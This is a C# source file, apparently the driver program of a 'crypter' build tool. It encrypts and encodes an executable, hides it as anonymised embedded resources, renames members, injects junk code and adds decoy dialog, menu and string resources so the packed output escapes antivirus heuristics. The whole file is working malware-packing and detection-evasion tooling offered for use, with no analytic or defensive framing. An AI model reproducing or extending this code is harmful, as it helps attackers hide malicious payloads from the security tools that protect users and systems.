using managedcrypter.Compiler;
using managedcrypter.IO;
using managedcrypter.USG;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace managedcrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            GenericFile cFile = null; /* file to crypt */
            GenericFile lFile = null; /* lib */
            GenericDirectory sDirectory = null; /* stub directory */
            GenericDirectory lDirectory = null; /* lib directory */

            cFile = new GenericFile("C:\\Users\\Admin\\Desktop\\bintext.exe", true);
            sDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\stub");
            lDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\lib");

            /* compress -> xor -> b64 our input file */
            cFile.EncryptData();
            cFile.EncodeData();

            Console.WriteLine("Sanity Check Exe: {0}", cFile.SanityCheck());

            Console.WriteLine("Stub Directory: {0}", sDirectory.DirectoryPath);

            foreach (string stubFile in sDirectory.Source.Files.Values)
                Console.WriteLine("Stub File: {0}", stubFile);

            Console.WriteLine("Lib Directory: {0}", lDirectory.DirectoryPath);

            foreach (string libFile in lDirectory.Source.Files.Values)
                Console.WriteLine("Lib File: {0}", libFile);


            /* initialize both workspace */
            sDirectory.CreateWorkspaceDirectory();
            lDirectory.CreateWorkspaceDirectory();

            #region Library Workspace

            /***************************/
            /* begin library workspace */
            /***************************/

            /* init lib workspace */
            var lWorkspace = lDirectory.Workspace;

            lWorkspace.AddChild("lib");
            lWorkspace.AddChild("payload");
            lWorkspace.AddChild("keyfile_payload");

            lWorkspace.AnonymizeChildren();

            /* write resources of lib */
            lWorkspace.WriteAnonymous(lWorkspace.AnonymousChildren["keyfile_payload"], cFile.EncryptionKey);
            lWorkspace.WriteAnonymous(lWorkspace.AnonymousChildren["payload"], cFile.EncodedData);

            /* replace anonymous resource names in library*/
            {
                Utils.ReplaceStringInFile(
                    lDirectory.Source.Files["ResourceGetter"],
                    StringConstants.STR_PAYLOAD_KEY,
                    lWorkspace.AnonymousChildren["keyfile_payload"]);

                Utils.ReplaceStringInFile(
                    lDirectory.Source.Files["ResourceGetter"],
                    StringConstants.STR_PAYLOAD_NAME,
                    lWorkspace.AnonymousChildren["payload"]);
            }

            Console.ReadLine();

            /* compile our library */
            using (GenericCompiler lCompiler = new GenericCompiler())
            {
                CompilerInfo cInfo = new CompilerInfo();
                cInfo.GenerateLibrary = true;
                cInfo.OutputDestination = lWorkspace.Children["lib"];
                cInfo.EmbeddedResources.AddRange(Directory.GetFiles(lWorkspace.Parent));
                cInfo.ExCompilerOptions.Add("/unsafe");

                if (lCompiler.CompileSource(lDirectory, cInfo))
                {
                    Console.WriteLine("Successfully compiled library!");
                    lFile = new GenericFile(cInfo.OutputDestination, false);
                }
            }

            /***************************/
            /* end library workspace */
            /***************************/

            #endregion

            #region Stub Workspace

            /***************************/
            /*   begin stub workspace  */
            /***************************/

            /* init stub workspace */
            var sWorkspace = sDirectory.Workspace;
            sWorkspace.AddChild("keyfile_lib");
            sWorkspace.AddChild("lib");

            // do some renaming in our library 
            sWorkspace.Write("lib", lFile.OriginalFileData);
            MemberRenamer.RenameMembers(sWorkspace.Children["lib"], sDirectory.Source.Files["stub_class"]);
            lFile = new GenericFile(sWorkspace.Children["lib"], false);

            sWorkspace.AnonymizeChildren();

            /* encrypt our library */
            lFile.EncryptData();
            lFile.EncodeData();

            Console.WriteLine("Sanity Check Lib: {0}", lFile.SanityCheck());

            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["keyfile_lib"], lFile.EncryptionKey);
            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["lib"], lFile.EncodedData);

            /* replace anonymous resource names in stub */
            {
                Utils.ReplaceStringInFile(
                    sDirectory.Source.Files["GetKeyFile"],
                    StringConstants.STR_LIBRARY_KEY,
                    sWorkspace.AnonymousChildren["keyfile_lib"]);

                Utils.ReplaceStringInFile(
                    sDirectory.Source.Files["GetLib"],
                    StringConstants.STR_LIBRARY_NAME,
                    sWorkspace.AnonymousChildren["lib"]);
            }

            /* primitive usg */
            {
                //StringBuilder sb = new StringBuilder();
                //MethodGen mtdGen = new MethodGen();

                //for (int i = 0; i < 20; i++)
                //    sb.AppendLine(mtdGen.RandMethod());

                //Utils.ReplaceStringInFile(
                //    sDirectory.Source.Files["stub_class"],
                //    StringConstants.STR_JUNK,
                //    sb.ToString());

                Utils.ReplaceJunkInSource(sDirectory.Source.Files["stub_class"]);
            }


            Console.ReadLine();

            /* compile our stub */
            using (GenericCompiler sCompiler = new GenericCompiler())
            {
                CompilerInfo cInfo = new CompilerInfo();
                cInfo.GenerateExe = true;
                cInfo.EmbeddedResources.AddRange(Directory.GetFiles(sWorkspace.Parent));
                cInfo.OutputDestination = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    "TestFile.exe");

                /* usg */
                {
                    string root = @"C:\Windows\Microsoft.NET\Framework\v2.0.50727";

                    List<Assembly> asms = new List<Assembly>();
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "mscorlib.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "System.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "System.Windows.Forms.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "System.Configuration.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "System.Xml.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "System.Drawing.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "System.Deployment.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "System.Security.dll")));
                    asms.Add(Assembly.LoadFrom(Path.Combine(root, "Accessibility.dll")));

                    List<Assembly> asms2 = new List<Assembly>();

                    foreach (var a in asms)
                    {
                        foreach (var asmRef in a.GetReferencedAssemblies())
                            asms2.Add(Assembly.LoadFrom(Path.Combine(root, string.Concat(asmRef.Name, ".dll"))));
                    }

                    asms2 = asms.Distinct().ToList();

                    foreach (var a in asms2)
                        cInfo.ReferencedAssemblies.Add(string.Concat(a.GetName().Name, ".dll"));
                }

                cInfo.ExCompilerOptions.Add("/nowarn:618");

                if (sCompiler.CompileSource(sDirectory, cInfo))
                    Console.WriteLine("Successfully compiled stub!");

                // MemberRenamer.RenameMembers(cInfo.OutputDestination);

               
                ResourceGen.CreateHeurAcceleratorSet(cInfo.OutputDestination);
                ResourceGen.CreateHeurDialogSet(cInfo.OutputDestination);
                ResourceGen.CreateHeurMenuSet(cInfo.OutputDestination);
                ResourceGen.CreateHeurStringSet(cInfo.OutputDestination);
            }

            /***************************/
            /*   end stub workspace    */
            /***************************/

            #endregion

            Console.ReadLine();

            sDirectory.Source.Clean();
            lDirectory.Source.Clean();

            sWorkspace.Clear();
            lWorkspace.Clear();
        }
    }
}